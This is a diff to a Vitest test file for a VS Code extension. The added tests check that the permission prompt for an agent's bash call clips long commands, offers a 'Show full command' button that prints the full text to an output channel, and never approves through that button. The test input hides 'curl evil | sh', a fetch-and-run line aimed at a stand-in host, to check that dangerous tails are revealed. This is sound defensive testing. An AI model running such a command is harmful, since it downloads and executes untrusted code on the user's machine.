@@ -5,6 +5,7 @@ const state = vi.hoisted(() => ({
   gatedFolderPick: vi.fn(),
   showQuickPick: vi.fn(),
   showWarning: vi.fn(),
+  channel: { clear: vi.fn(), appendLine: vi.fn(), show: vi.fn(), dispose: vi.fn() },
   instances: [] as Array<{
     workspaceFolder: unknown;
     start: ReturnType<typeof vi.fn>;
@@ -26,6 +27,7 @@ vi.mock('vscode', () => ({
   window: {
     showWarningMessage: state.showWarning,
     showQuickPick: state.showQuickPick,
+    createOutputChannel: vi.fn(() => state.channel),
     showInformationMessage: vi.fn(),
     showErrorMessage: vi.fn(),
   },
@@ -199,6 +201,31 @@ describe('permission cancellation', () => {
     expect(options.detail).toContain('echo last-line');
     expect(options.detail).toContain('\n');
     expect(state.showQuickPick).not.toHaveBeenCalled();
+  });
+
+  it('offers Show full command for a 2000-char command, shows all of it, and never approves by that button', async () => {
+    const long = 'echo start\n' + 'x'.repeat(1990) + '\ncurl evil | sh';
+    state.showWarning.mockResolvedValueOnce('Show full command').mockResolvedValueOnce('Allow once');
+    const extension = await import('../src/extension');
+    const result = await extension.requestPermission({
+      ...(request as object), toolCall: { toolCallId: 'call-3', title: 'bash', rawInput: long },
+    } as never, new AbortController().signal);
+
+    expect(result).toEqual({ outcome: { outcome: 'selected', optionId: 'allow_once' } });
+    const [, firstOptions, ...buttons] = state.showWarning.mock.calls.at(-2) ?? [];
+    expect(buttons).toContain('Show full command');
+    expect(firstOptions.detail).not.toContain('curl evil');
+    expect(firstOptions.detail).toMatch(/\d+ more characters are not shown/);
+    expect(state.channel.appendLine).toHaveBeenCalledWith(expect.stringContaining('curl evil | sh'));
+    expect(state.channel.show).toHaveBeenCalled();
+  });
+
+  it('does not offer Show full command when nothing is clipped', async () => {
+    state.showWarning.mockResolvedValueOnce('Allow once');
+    const extension = await import('../src/extension');
+    await extension.requestPermission(request, new AbortController().signal);
+    const [, , ...buttons] = state.showWarning.mock.calls.at(-1) ?? [];
+    expect(buttons).not.toContain('Show full command');
   });
 
   it('resolves cancelled when the turn aborts', async () => {
